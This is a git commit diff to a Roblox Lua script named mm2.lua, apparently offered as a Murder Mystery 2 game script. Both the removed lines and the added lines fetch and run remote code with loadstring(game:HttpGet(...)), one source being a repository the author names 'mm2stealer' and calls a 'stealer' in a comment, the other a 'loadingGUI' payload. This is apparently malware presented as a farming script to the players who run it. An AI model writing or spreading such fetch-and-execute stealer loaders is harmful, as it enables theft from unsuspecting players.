4f28b7cad389bc78296b310ddbf61360fb7e48f5
ScriptsHub11 <martinnader717@gmail.com>
2025-07-21 22:35:56 +0300

    Update mm2.lua

--- mm2.lua
+++ mm2.lua
@@ -1,22 +1,2 @@
-local function stealer(callback)
-    pcall(function()
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptsHub11/mm2stealer/refs/heads/main/mm2stealerr'))()
-    end)
-    -- Delay just to be safe in case stealer does any UI stuff
-    task.delay(1, callback)
-end
-
-local function farm()
-    local player = game:WaitForChild("Players"):WaitForChild("LocalPlayer")
-    player:WaitForChild("PlayerGui")
-    wait(1)
-    pcall(function()
-        local code = game:HttpGet("https://raw.githubusercontent.com/ScriptsHub11/loadingGUI/refs/heads/main/loadingGUI")
-        if code and #code > 10 then
-            loadstring(code)()
-        end
-    end)
-end
-
--- Execute stealer first, then farm
-stealer(farm)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHub11/mm2stealer/refs/heads/main/mm2stealerr"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHub11/loadingGUI/refs/heads/main/loadingGUI"))()
